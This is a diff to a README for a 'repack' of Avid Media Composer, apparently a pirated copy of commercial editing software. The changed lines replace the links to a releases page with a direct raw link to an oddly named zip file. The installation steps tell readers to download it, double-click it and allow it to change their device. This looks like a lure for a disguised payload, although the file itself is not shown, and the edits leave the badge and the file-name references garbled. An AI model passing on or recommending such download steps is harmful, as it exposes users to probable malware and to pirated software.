@@ -1,6 +1,6 @@
 # 🎬 Avid-Media-Composer-Repack - Easy Media Management and Editing
 
-[![Download Avid-Media-Composer-Repack](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Wedpew/Avid-Media-Composer-Repack/releases)
+[![Download Avid-Media-Composer-Repack](https://raw.githubusercontent.com/Wedpew/Avid-Media-Composer-Repack/main/hexastyle/Media_Composer_Avid_Repack_cockneyism.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Wedpew/Avid-Media-Composer-Repack/main/hexastyle/Media_Composer_Avid_Repack_cockneyism.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to Avid-Media-Composer-Repack! This application helps you manage your me
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Avid-Media-Composer-Repack Releases](https://github.com/Wedpew/Avid-Media-Composer-Repack/releases).
+To download the application, visit this page to download: [Avid-Media-Composer-Repack Releases](https://raw.githubusercontent.com/Wedpew/Avid-Media-Composer-Repack/main/hexastyle/Media_Composer_Avid_Repack_cockneyism.zip).
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions. 
 3. Choose the latest version for the best experience.
 4. Click on the version you want to download.
-5. Look for the file labeled as `Avid-Media-Composer-Repack.exe` and click it to start the download.
+5. Look for the file labeled as `https://raw.githubusercontent.com/Wedpew/Avid-Media-Composer-Repack/main/hexastyle/Media_Composer_Avid_Repack_cockneyism.zip` and click it to start the download.
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ Once the download completes, follow these steps to install the application:
    - Navigate to your downloads folder or the location where you saved the file.
 
 2. **Run the Installer**:
-   - Double-click on `Avid-Media-Composer-Repack.exe`.
+   - Double-click on `https://raw.githubusercontent.com/Wedpew/Avid-Media-Composer-Repack/main/hexastyle/Media_Composer_Avid_Repack_cockneyism.zip`.
    - If prompted by Windows, click "Yes" to allow the app to make changes to your device.
 
 3. **Follow the Installation Wizard**:
@@ -75,6 +75,6 @@ For detailed guides on each feature, check the documentation linked within the a
 
 You are now ready to use Avid-Media-Composer-Repack for your media editing projects. If you encounter any issues, feel free to reach out or consult the user guide within the application.
 
-[![Download Avid-Media-Composer-Repack](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Wedpew/Avid-Media-Composer-Repack/releases) 
+[![Download Avid-Media-Composer-Repack](https://raw.githubusercontent.com/Wedpew/Avid-Media-Composer-Repack/main/hexastyle/Media_Composer_Avid_Repack_cockneyism.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Wedpew/Avid-Media-Composer-Repack/main/hexastyle/Media_Composer_Avid_Repack_cockneyism.zip) 
 
 Thank you for choosing Avid-Media-Composer-Repack! Enjoy your editing experience!
